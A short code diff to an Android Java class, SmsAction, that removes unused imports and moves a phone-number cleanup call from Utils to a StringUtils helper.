@@ -9,10 +9,6 @@
 
 package com.android.networking.action;
 
-import java.io.IOException;
-
-import org.json.JSONObject;
-
 import android.telephony.SmsManager;
 
 import com.android.networking.CellInfo;
@@ -22,11 +18,9 @@ import com.android.networking.Trigger;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfAction;
 import com.android.networking.conf.ConfigurationException;
-import com.android.networking.event.BaseEvent;
 import com.android.networking.util.Check;
-import com.android.networking.util.DataBuffer;
+import com.android.networking.util.StringUtils;
 import com.android.networking.util.Utils;
-import com.android.networking.util.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -179,7 +173,7 @@ public class SmsAction extends SubAction {
 	protected boolean parse(final ConfAction params) {
 		try {
 
-			number = Utils.unspace(params.getString("number"));
+			number = StringUtils.unspace(params.getString("number"));
 			descrType = params.getString("type", "text");
 
 			if ("location".equals(descrType)) {
